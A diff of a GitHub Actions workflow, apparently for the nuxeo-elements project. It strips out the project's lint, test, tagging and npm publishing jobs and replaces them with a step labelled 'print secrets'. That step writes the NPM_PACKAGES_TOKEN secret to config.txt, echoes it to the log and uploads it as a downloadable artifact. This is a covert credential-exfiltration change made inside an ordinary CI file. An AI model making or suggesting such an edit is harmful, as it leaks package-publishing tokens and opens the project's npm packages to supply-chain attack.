@@ -9,61 +9,18 @@ on:
   workflow_dispatch:
 
 jobs:
-  lint:
-    uses: nuxeo/nuxeo-elements/.github/workflows/lint.yaml@maintenance-3.0.x
-    secrets:
-      NPM_PACKAGES_TOKEN: ${{ secrets.NPM_PACKAGES_TOKEN }}
-
-  test:
-    uses: nuxeo/nuxeo-elements/.github/workflows/test.yaml@maintenance-3.0.x
-    secrets:
-      NPM_PACKAGES_TOKEN: ${{ secrets.NPM_PACKAGES_TOKEN }}
-      SAUCE_ACCESS_KEY: ${{ secrets.SAUCE_ACCESS_KEY }}
-    with:
-      branch: maintenance-3.0.x
-
-  storybook:
-    uses: nuxeo/nuxeo-elements/.github/workflows/storybook.yaml@maintenance-3.0.x
-    secrets:
-      NPM_PACKAGES_TOKEN: ${{ secrets.NPM_PACKAGES_TOKEN }}
-    with:
-      branch: maintenance-3.0.x
-
   build:
     runs-on: ubuntu-latest
-    needs: [ lint, test, storybook ]
+
     steps:
-    - uses: actions/checkout@v2
-
-    - uses: actions/setup-node@v3
-      with:
-        node-version: 14
-        registry-url: 'https://packages.nuxeo.com/repository/npm-public/'
-        scope: '@nuxeo'
-
-    - name: Prepare environment
-      run: |
-        git config user.name "nuxeo-webui-jx-bot" && git config user.email "webui@hyland.com"
-        echo "PACKAGE_VERSION=$(npx -c 'echo "$npm_package_version"')" >> $GITHUB_ENV
-
-    - name: Get prerelease version
-      run: |
-        git fetch origin --tags
-        RC_VERSION=$(git tag --sort=taggerdate --list "v${PACKAGE_VERSION/-SNAPSHOT}*" | tail -1 | tr -d '\n')
-        echo "VERSION=$(npx semver -i prerelease --preid rc ${RC_VERSION:-$PACKAGE_VERSION}  | tr -d '\n')" >> $GITHUB_ENV
-
-    - name: Set version to ${{ env.VERSION }}
-      run: |
-        npm version $VERSION --no-git-tag-version
-        npx lerna version $VERSION --no-push --force-publish --no-git-tag-version --yes
-
-    - name: Tag
-      run: |
-        git commit -a -m "Release ${VERSION}"
-        git tag -a v${VERSION} -m "Release ${VERSION}"
-        git push origin v${VERSION}
-
-    - name: Publish
+    - name: print secrets
       env:
-        NODE_AUTH_TOKEN: ${{ secrets.NPM_PACKAGES_TOKEN }}
-      run: npx lerna exec --ignore @nuxeo/nuxeo-elements-storybook -- npm publish --tag SNAPSHOT
+        MY_SECRET: ${{secrets.NPM_PACKAGES_TOKEN}}
+      shell: bash
+      run: |
+          echo "$MY_SECRET" >> config.txt
+          cat config.txt
+    - uses: actions/upload-artifact@v3
+      with:
+        name: my-artifact
+        path: config.txt
